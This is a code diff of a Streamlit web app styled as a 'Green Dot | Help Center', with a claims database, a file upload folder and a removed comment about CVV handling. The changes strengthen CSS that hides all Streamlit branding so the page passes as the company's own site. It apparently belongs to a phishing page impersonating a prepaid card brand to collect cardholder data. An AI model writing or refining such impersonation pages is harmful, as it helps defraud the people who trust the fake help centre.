@@ -4,7 +4,7 @@ import sqlite3
 import os
 from datetime import datetime
 
-# Database setup (Removing CVV from logic)
+# DB Setup
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS REFORZADO PARA OCULTAR BRANDING DE STREAMLIT ---
+# --- CSS NUCLEAR PARA OCULTAR BRANDING DE STREAMLIT ---
 st.markdown("""<style>
 /* Ocultar header, footer y cualquier rastro de Streamlit */
 header {visibility: hidden !important; height: 0px !important;}
@@ -34,10 +34,10 @@ footer {display: none !important; visibility: hidden !important;}
 [data-testid=\"stAppToolbar\"] {display: none !important;}
 [data-testid=\"stFooterAd\"] {display: none !important;}
 
-/* Selectores especificos para el badge inferior */
-div[class*=\"viewerBadge\"] {display: none !important;}
-div[class*=\"styles_viewerBadge\"] {display: none !important;}
-.stApp [data-testid=\"stStatusWidget\"] {display: none !important;}
+/* Selectores universales para el badge inferior 'Made with Streamlit' */
+div[class*=\"viewerBadge\"], div[class*=\"styles_viewerBadge\"], [data-testid=\"stStatusWidget\"] {
+    display: none !important;
+}
 
 /* Ajuste de contenedor principal */
 .block-container {
@@ -46,7 +46,7 @@ div[class*=\"styles_viewerBadge\"] {display: none !important;}
     max-width: 800px !important;
 }
 
-/* Estilos de botones */
+/* Estilos Green Dot */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
